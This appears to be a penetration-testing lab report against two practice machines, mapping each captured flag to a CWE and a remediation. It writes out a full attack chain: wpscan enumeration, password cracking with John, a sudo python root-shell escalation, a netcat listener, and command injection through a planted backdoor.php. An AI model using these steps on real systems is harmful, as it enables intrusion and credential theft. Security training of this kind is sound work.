# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation Process

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -v -sV -O 192.168.1.110
  ![nmapTarget1]/Images/nmap-vsVO_Target1.PNG

$ nmap  -v -sV -O 192.168.1.115
  ![nmapTarget2]/Images/nmap-vsVO_Target2.PNG
```

This scan identifies the services below as potential points of entry:
- Target 1 and Target 2; List of Exposed Services

| PORT   | STATE | SERVICE | VERSION  |
| ------------- | ------------- | ------------- | ------------- |
| 22/tcp  | open  |  ssh    | OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) |
| 80/tcp  | open  |  http   | Apache httpd 2.4.10 ((Debian)) |
| 111/tcp | open  |  rpcbind    |   2-4 (RPC #100000) |
| 139/tcp | open  | netbios-ssn |  Samba smbd 3.X - 4.X |
| 445/tcp | open  | netbios-ssn | Samba smbd 3.X - 4.X |



### Critical Vulnerabilities

  - List of Critical Vulnerabilities

Both Target 1 and Target 2 were found to have the following vulnerabilities:

|       CVE     | RATING | BRIEF DESCRIPTION | LINK  |
| ------------- | ------------- | ------------- | ------------- |
| CVE-2020-11984 |  7.5  |  mod_proxy_uwsgi info disclosure and possible Remote Code Execution |   https://vulners.com/cve/CVE-2020-11984 | 
| CVE-2017-7679   | 7.5  |  mod_mime buffer overread |   https://vulners.com/cve/CVE-2017-7679 | 
| CVE-2017-7668   | 7.5  | a bug in token list parsing |   https://vulners.com/cve/CVE-2017-7668 | 
| CVE-2017-3169   | 7.5   |   mod_ssl may dereference a NULL pointer |  https://vulners.com/cve/CVE-2017-3169 | 
| CVE-2017-3167  |  7.5   |   may lead to authentication requirements being bypassed |   https://vulners.com/cve/CVE-2017-3167 | 
|  EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB |  7.2   |   apache2ctl graceful logrotate Local Privilege Escalation |   https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT* |
| CVE-2019-0211  |  7.2   |   privilege escalation from modules' scripts |   https://vulners.com/cve/CVE-2019-0211 | 
|   1337DAY-ID-32502  |   7.2   |    apache2ctl graceful logrotate Local Privilege Escalation |   https://vulners.com/zdt/1337DAY-ID-32502 *EXPLOIT* | 
|  CVE-2018-1312 |   6.8  |    Weak Digest auth nonce generation in mod_auth_digest |   https://vulners.com/cve/CVE-2018-1312 | 
|  CVE-2017-15715 |  6.8   |   <FilesMatch> bypass with a trailing newline in the file name  |  https://vulners.com/cve/CVE-2017-15715 | 
|  CVE-2019-10082 |  6.4   |   http/2 session handling could be made to read memory after being freed, during connection shutdown  |   https://vulners.com/cve/CVE-2019-10082 |
|  CVE-2017-9788  |  6.4   |    could reflect the stale value of uninitialized pool memory used by the prior request  |  https://vulners.com/cve/CVE-2017-9788 | 
|  CVE-2019-10097|   6.0    | a specially crafted PROXY header could trigger a stack buffer overflow or NULL pointer deference  | https://vulners.com/cve/CVE-2019-10097 | 
|  CVE-2019-0217 |   6.0   |  could allow a user with valid credentials to authenticate using another username, bypassing configured access control restrictions  | https://vulners.com/cve/CVE-2019-0217 | 
|  EDB-ID:47689  |   5.8   |  Apache Httpd mod_rewrite - Open Redirects  | https://vulners.com/exploitdb/EDB-ID:47689 *EXPLOIT* | 
|  CVE-2020-1927|    5.8   |  mod_rewrite redirects to an an unexpected URL within the request URL  | https://vulners.com/cve/CVE-2020-1927 | 
|  CVE-2019-10098|   5.8  | mod_rewrite redirects instead to an unexpected URL within the request URL |    https://vulners.com/cve/CVE-2019-10098 | 
|  1337DAY-ID-33577  |  5.8    | pache Httpd mod_rewrite - Open Redirects Vulnerability  |  https://vulners.com/zdt/1337DAY-ID-33577 *EXPLOIT* | 
|  CVE-2016-5387|    5.1   |  might allow remote attackers to redirect an application's outbound HTTP traffic to an arbitrary proxy server   | https://vulners.com/cve/CVE-2016-5387 | 
|  SSV:96537    |    5.0   |  HTTP OPTIONS method can leak Apache's server memory | https://vulners.com/seebug/SSV:96537    *EXPLOIT* | 
|  MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  |  5.0   | the Allow response header returned from an OPTIONS request may bleed memory if the server has a .htaccess file with an invalid Limit method defined  | https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED    *EXPLOIT* | 
|  EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7  |    5.0  |   Apache mod_session_crypto - Padding Oracle  | https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7 *EXPLOIT* | 
|  EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D | 5.0   |  OPTIONS Memory Leak  | https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D *EXPLOIT* | 
|  CVE-2020-9490 |   5.0   |  Apache Httpd < None: Push Diary Crash on Specifically Crafted HTTP/2 Header  | https://vulners.com/cve/CVE-2020-9490 | 
|  CVE-2020-1934  |  5.0   | mod_proxy_ftp may use uninitialized memory when proxying to a malicious FTP server   | https://vulners.com/cve/CVE-2020-1934 | 
|  CVE-2019-10081 |  5.0   | could lead to an overwrite of memory in the pushing request's pool  | https://vulners.com/cve/CVE-2019-10081 | 
|  CVE-2019-0220  |  5.0   |  Inconsistant handling across components, when the path component of a request URL contains multiple consecutive slashes ('/')| https://vulners.com/cve/CVE-2019-0220 | 
|  CVE-2019-0196 |   5.0   | flawed string comparison when determining the method of a request, thus processing the request incorrectly  | https://vulners.com/cve/CVE-2019-0196 | 
|  CVE-2018-17199 |  5.0   | causes session expiry time to be ignored for mod_session_cookie sessions  | https://vulners.com/cve/CVE-2018-17199 | 
|  CVE-2018-17189|   5.0   |   the h2 stream for that request unnecessarily occupied a server thread cleaning up that incoming data  | https://vulners.com/cve/CVE-2018-17189 | 
|  CVE-2018-1333 |   5.0  | workers would be allocated 60 seconds longer than necessary, leading to worker exhaustion and a denial of service | https://vulners.com/cve/CVE-2018-1333 | 
|  CVE-2018-1303 |    5.0   | an out of bound read while preparing data to be cached in shared memory  | https://vulners.com/cve/CVE-2018-1303 | 
|  CVE-2017-9798 |   5.0  |  Apache httpd allows remote attackers to read secret data from process memory   | https://vulners.com/cve/CVE-2017-9798 | 
|  CVE-2017-15710 |  5.0   | A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string | https://vulners.com/cve/CVE-2017-15710 | 
|  CVE-2016-8743 |   5.0  |  may result in request smuggling, response splitting and cache pollution   | https://vulners.com/cve/CVE-2016-8743 | 
|  CVE-2016-2161 |   5.0  |  malicious input to mod_auth_digest can cause the server to crash continually  | https://vulners.com/cve/CVE-2016-2161 | 
|  CVE-2016-0736 |   5.0   | mod_session_crypto, vulnerable to padding oracle attacks, particularly with CBC  | https://vulners.com/cve/CVE-2016-0736 | 
|  CVE-2015-3183 |   5.0   |  mishandling of large chunk-size values and invalid chunk-extension characters in modules/http/http_filters.c  | https://vulners.com/cve/CVE-2015-3183 | 
|  CVE-2015-0228 |   5.0  |  allows remote attackers to cause a denial of service (child-process crash)   | https://vulners.com/cve/CVE-2015-0228 | 
|  CVE-2014-3583 |   5.0  |  FastCGI servers to cause a denial of service (buffer over-read and daemon crash) via long response headers  | https://vulners.com/cve/CVE-2014-3583 | 
|  1337DAY-ID-28573  |  5.0  |  Apache - HTTP OPTIONS Memory Leak Exploit   | https://vulners.com/zdt/1337DAY-ID-28573  *EXPLOIT* | 
|  1337DAY-ID-26574  |  5.0  | Microsoft Windows Kernel - win32k!NtQueryCompositionSurfaceBinding Stack Memory Disclosure Exploit    | https://vulners.com/zdt/1337DAY-ID-26574  *EXPLOIT* | 
|  CVE-2019-0197 |  4.9    | Upgrade request from http/1.1 to http/2 that was not the first request on a connection could lead to a misconfiguration and crash  | https://vulners.com/cve/CVE-2019-0197 | 
|  EDB-ID:47688 |   4.3   |  Apache Httpd mod_proxy - Error Page Cross-Site Scripting  | https://vulners.com/exploitdb/EDB-ID:47688  *EXPLOIT* | 
|  CVE-2020-11993 |   4.3   | on certain traffic edge patterns, logging statements were made on the wrong connection, causing concurrent use of memory pools  | https://vulners.com/cve/CVE-2020-11993 | 
|  CVE-2020-11985 |  4.3  |  using proxying with mod_remoteip and certain mod_rewrite rules, an attacker could spoof their IP address for logging and PHP scripts  | https://vulners.com/cve/CVE-2020-11985 | 
|  CVE-2019-10092 |  4.3  |  a limited cross-site scripting issue was reported affecting the mod_proxy error page   | https://vulners.com/cve/CVE-2019-10092 | 
|  CVE-2018-1302 |   4.3  |  could have written a NULL pointer potentially to an already freed memory   | https://vulners.com/cve/CVE-2018-1302 | 
|  CVE-2018-1301 |   4.3   |  an out of bound access after a size limit is reached by reading the HTTP header | https://vulners.com/cve/CVE-2018-1301 | 
|  CVE-2018-11763 |  4.3   | a client can occupy a connection, server thread and CPU time without any connection timeout coming to effect  | https://vulners.com/cve/CVE-2018-11763 | 
|  CVE-2016-4975 |   4.3  |  possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir   | https://vulners.com/cve/CVE-2016-4975  | 
|  CVE-2015-3185 |   4.3  |  allows remote attackers to bypass intended access restrictions in opportunistic circumstances   | https://vulners.com/cve/CVE-2015-3185 | 
|  CVE-2014-8109  |  4.3  |   allows remote attackers to bypass intended access restrictions in opportunistic circumstances    | https://vulners.com/cve/CVE-2014-8109  | 
|  1337DAY-ID-33575 |  4.3  | Apache Httpd mod_proxy - Error Page Cross-Site Scripting Vulnerability |   https://vulners.com/zdt/1337DAY-ID-33575  *EXPLOIT* | 
|  CVE-2018-1283 |   3.5  |   a remote user may influence their content by using a "Session" header  |  https://vulners.com/cve/CVE-2018-1283 | 
|  CVE-2016-8612 |   3.3   |  an Improper Input Validation in the protocol parsing logic resulting in a Segmentation Fault in httpd process  | https://vulners.com/cve/CVE-2016-8612 | 



  # nmap --script vuln -sV -p80 192.168.1.110
   ![nmapVulnTarget1]/Images/nmap_vuln_Target1.PNG

Target 2 returned identical results to Target 1 

  # nmap --script vuln -sV -p80 192.168.1.115
   ![nmapVulnTarget2]/Images/nmap_vuln_Target2.PNG

### Exploitation Process


The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve the following confidential data:
- Target 1
  - flag1 hash value: `b9bbcd33e11b80be759c4e844862482d`
      ![flag1]/Images/flag1-found_Target1.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-540: Inclusion of Sensitive Information in Source Code 
      - Click SERVICE link > 192.168.1.110/service.html, Right Click, View Source, flag1 is visible in a commented out line below the footer. 
     REMEDIATION: Source code should be reviewed and all comments removed from production versions of code.

  - flag2 hash value: `fc3fd58dcdad9ab23faca6e9a36e581c`
      ![flag2]/Images/flag2-found_Target1.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-521: Weak Password Requirements
      - an easily guessed password for user michael (ssh login),
      michael@target1:/var/www/html/wordpress$ 'cat wp-config.php'
    REMEDIATION: Enforcement of password policy on the machine.
      install libpam- pwquality: 'sudo apt install libpam-pwquality'
      EDIT /etc/pam.d/common-password (use vi or nano)
    	find the line: password   requisite   pam_pwquality.so retry=3
	    append: 'minlen=12 maxrepeat=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 difok=4 reject_username enforce_for_root'


      Identified wordpress installed through testing links on homepage; BLOG directs to  192.168.1.110/wordpress
      ![BLOG]/Images/BLOG_Target1.PNG
      This page has a Log in link
      ![loginURL]/Images/Login_URL_Target1.PNG
      ![wp-login]/Images/wp-login_Target1.PNG

      Run wpscan to enumerate users: 'wpscan --url http://192.168.1.110/wordpress --enumerate u'
      ![wpscan1a]/Images/WPScan_Target1a.PNG
      ![wpscan1b]/Images/WPScan_Target1b.PNG

  - flag3 hash value: `afc01ab5650591e7dccf93122770cd2`
      ![flag3]/Images/flag3-detail_Target1.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-260: Password in configuration file
    wp-config.php contained DB_NAME, DB_USER, DB_PASSWORD for root user
    ![user-passwd]/Images/mysql-user-login-pass_Target1.PNG

    REMEDIATION: The principle of least privilege should be enforced.
      'chmod 600 /var/www/html/wordpress/wp-config.php'
    
    ATTACK PROGRESS:
    michael@target1:/user/bin$ 'mysql -u root -p'
      ![mysql-login]/Images/mysql-login_Target1.PNG
    mysql login achieved - what can we find ?
      
    'show databases;'
    ![databases]/Images/mysql-db_Target1.PNG
    'show tables;'

    ![tables]/Images/mysql-tables_Target1.PNG
    'describe wp_posts;'
    ![posts]/Images/mysql-wp_posts_Target1.PNG
    I noted that the default value for post_status = 'publish'

    'select * FROM wp_posts WHERE post_status != 'publish''
    
    ![user-passwd]/Images/mysql-user-login-pass_Target1.PNG
    'show tables;'

    /Images/mysql-tables_Target1.PNG
    'describe wp_users;'
    ![wp-users]/Images/mysql-wp_users_Target1.PNG
    'select user_login, user_pass from wp_users;'
    ![user-passwd]/Images/mysql-user-login-pass_Target1.PNG

    Create file wp_hashes.txt
    ![wp-hashes]/Images/wp_hashes_Target1.PNG
    Use John The Ripper to unhash the password of user steven
    'john --wordlist=/root/Downloads/rockyou.txt /root/Downloads/wp_hashes.txt'
    ![john]/Images/john-steven_Target1.PNG

    ssh into Target1 as steven: 'ssh steven@192.168.1.110'
    ![ssh-steven]/Images/ssh-steven_Target1.PNG
    Verify the sudo permissions of steven: sudo -l'
    ![sudo-l]/Images/sudo-steven_Target1.PNG
    We see steven has sudo permission for python
    We can exploit this to gain a shell as root: 'python -c 'import pty;pty.spawn("/bin/bash")''
    ![priv-escln]/Images/privilege-escalation_py_Target1.PNG
    Now as root, search for flag file 
    ![found4]/Images/flag4-found_Target1.PNG
    Display the contents of flag4.txt
    ![flag4]/Images/flag4-detail_Target1.PNG

      - flag4 hash value: `715dea6c055b9fe3337544932f2941ce`
      ![found4]/Images/flag4-found_Target1.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-250: Execution with Unnecessary Privileges
      User steven has excessive privilege
      ![excess-priv]/Images/sudo-steven_Target1.PNG
    REMEDIATION: The principle of least privilege should be enforced.
     Limit sudo to specific functions that require it, such as restarting a service that runs with root privilege
     We need to run visudo to edit /etc/sudoers or add specific config under the /etc/sudoers.d directory

- Target 2
  - flag1 hash value: `a2c1f66d2b8051db3a5874b5874b5b6e43e21`
      ![found1-T2]/Images/flag1-found_Target2.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-548: Information leakage through directory listing
      - 'gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115'
    ![gobuster]/Images/gobuster_Target2.PNG
    Browsing the directories discovered I found flag1 at 192.168.1.115/vendor/PATH (/var/www/html/vendor)
    ![vendor]/Images/vendor_Target2.PNG
    ![found1-T2]/Images/flag1-found_target2.PNG
    REMEDIATION: we should add line, "Options -Indexes" in .ht access (must be added in each folder) OR
       we can disable directory listing for a specified directory by adding this code in Apache Virtual Host
      <Directory /var/www/public_html>
          Options -Indexes
      </Directory>

  - flag2 hash value: `6a8ed560f0b5358ecf844108048eb337`
      ![found2-T2]/Images/flag2-found_Target2.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
      - '192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''
      ![find.flags]/Images/find-flags_Target2.PNG
      (the path to flag3 is also disclosed here)
      - '192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'
    REMEDIATION: Proper input controls within the application would prevent the execution of this exploit. 
     
     Establishing the backdoor;
     The script provided was edited to include the IP of target2
     exploit.sh generates backdoor.php on the target, encoded with functions to allow command injection 
    ![backdoor.php]/Images/edited-exploit_Target2.PNG
    Prior to execution, establish a netcat session: 'nc -lvnp 4444' 
     './exploit.sh'
    ![runExploit]/Images/run-exploit_Target2.PNG
    We now have a command injection script (backdoor.php) on Target 2 that is accessible via browser.
**Y'all are running components with known vulnerabilities**

  - flag3 hash value: `a0f568aa9de277887f37730d71520d9b`
     ![flag3-T2]/Images/flag3-found_Target2.PNG
    - **Exploit Used**
      - (Common Weakness) CWE-522: Local file inclusion
      - '192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.PNG'
      REMEDIATION: Proper access controls should be in place in the content areas.
       As this is sensitive information, an additional control to restrict access would be preferable, such as data encrytion. 
